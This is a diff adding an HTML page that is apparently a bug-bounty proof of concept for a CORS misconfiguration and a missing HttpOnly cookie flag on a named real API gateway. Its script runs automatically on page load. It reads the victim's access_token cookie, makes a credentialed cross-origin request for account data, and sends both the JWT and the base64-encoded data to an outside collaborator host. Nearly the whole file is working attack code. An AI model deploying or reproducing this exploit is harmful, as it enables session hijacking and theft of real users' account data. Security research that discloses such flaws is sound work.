@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Research PoC</title>
+    <style>
+        body { font-family: sans-serif; background: #f0f2f5; padding: 50px; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
+        .stolen { color: #d9534f; font-weight: bold; word-break: break-all; }
+        #status { font-weight: bold; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>CORS + Cookie Flag Exploit PoC</h2>
+        <div id="status" style="color: blue;">Initializing Exploit...</div>
+        <p><strong>Step 1: Stolen JWT:</strong></p>
+        <div id="jwt-area" class="stolen">Waiting...</div>
+        <p><strong>Step 2: Stolen Account Data:</strong></p>
+        <pre id="data-area" class="stolen">Waiting...</pre>
+    </div>
+    <script>
+        const target = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
+        const collaborator = "https://lj82gdt3ghraty65x3bna1ed349vxmpae.oastify.com"; // <-- REPLACE WITH YOUR COLLABORATOR URL
+
+        async function startExploit() {
+            try {
+                // 1. Theft via missing HttpOnly
+                const cookies = document.cookie;
+                const tokenMatch = cookies.match(/access_token=([^;]+)/);
+                if (tokenMatch) {
+                    const jwt = tokenMatch[1];
+                    document.getElementById('jwt-area').innerText = jwt;
+                    fetch(`${collaborator}/?type=jwt_theft&token=${jwt}`);
+                }
+
+                // 2. Theft via Reflected CORS
+                const response = await fetch(target, { method: "GET", credentials: "include" });
+                const json = await response.json();
+                document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
+                document.getElementById('status').innerText = "EXPLOIT SUCCESSFUL - DATA EXFILTRATED";
+                document.getElementById('status').style.color = "red";
+
+                // Exfiltrate to Collaborator
+                fetch(`${collaborator}/?type=cors_data&payload=${btoa(JSON.stringify(json))}`);
+            } catch (err) {
+                document.getElementById('status').innerText = "Exploit Failed: " + err.message;
+                document.getElementById('status').style.color = "orange";
+            }
+        }
+        window.onload = startExploit;
+    </script>
+</body>
+</html>
